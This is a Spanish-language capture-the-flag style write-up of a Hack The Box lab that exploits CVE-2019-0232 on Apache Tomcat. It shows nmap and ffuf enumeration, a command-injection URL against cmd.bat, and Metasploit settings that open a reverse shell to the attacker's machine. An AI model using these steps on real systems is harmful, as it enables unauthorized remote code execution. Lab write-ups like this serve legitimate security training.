Laboratorio de Atacando a aplicaciones Comunes - Parte 1

Oct 6, 2025 · 2 mins read
hackthebox servlets Tomcat

Enunciado

Durante una prueba de penetración contra la empresa Inlanefreight, realizó una enumeración exhaustiva y descubrió que la red estaba bastante protegida y bien reforzada. Encontró un host de particular interés que podría ser su puerta de entrada. Enumere el host objetivo en busca de aplicaciones potencialmente vulnerables, obtenga acceso y envíe el contenido del archivo flag.txt para completar esta parte de la evaluación de habilidades.

¿Qué aplicación vulnerable se está ejecutando? Empezamos con la enumeración del equipo:

nmap -p- -sS --min-rate 1000 -n -Pn <IP>

Profundizamos un poco más en los servicios que están corriendo y vemos:

nmap -p21,80,135,139,445,3389,5985,8009,8080,47001 -sCV -n -Pn <IP>

Vemos que sobre el puerto 8080 corre una de las aplicaciones que vimos en el presente modulo en este caso Apache Tomcat. ¿En qué puerto se ejecuta esta aplicación? Corre por el 8080.

¿Qué versión de la aplicación está en uso? Versión 9.0.0.M1

Explota la aplicación para obtener un shell y enviar el contenido del archivo flag.txt en el escritorio del Administrador. Probando con las vulnetabilidades que nos hablaron en el módulo sobre esta herramienta vemos que CVE-2019-0232 afecta a la versión a la que estamos analizando y nos ofrece a priori RCE. Con lo cual es interesante mirarla. Primero debemos buscar si existe algún script cgi, al estar en Windows la aplicación buscamos con archivos .bat o .cmd.

ffuf -u http://<IP>:8080/cgi/FUZZ.bat -w /usr/share/SecLists/Discovery/Web-Content/common.txt --mc 200 -c -ic

Y vemos que existe el script cmd.bat. Al intentar desde la url http://ip:8080/cgi/cmd.bat?&dir vemos que no nos ejecuta el comando en el servidor. Le echamos un vistazo con Metasploit a ver si podemos explotarla de igual modo.

search tomcat

use exploit/windows/http/tomcar_cgi_cmdlineargs


set rhost <IP>
set lhost <Nuestra_IP>
set targeturi /cgi/cmd.bat
set autocheck false
run

Y vemos que pudimos explotar la vulnerabilidad con éxito dado que nos brindo una shell en el servidor. Permitiéndonos ejecutar comandos. Ya es ir al directorio indicado y leer la flag.

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.
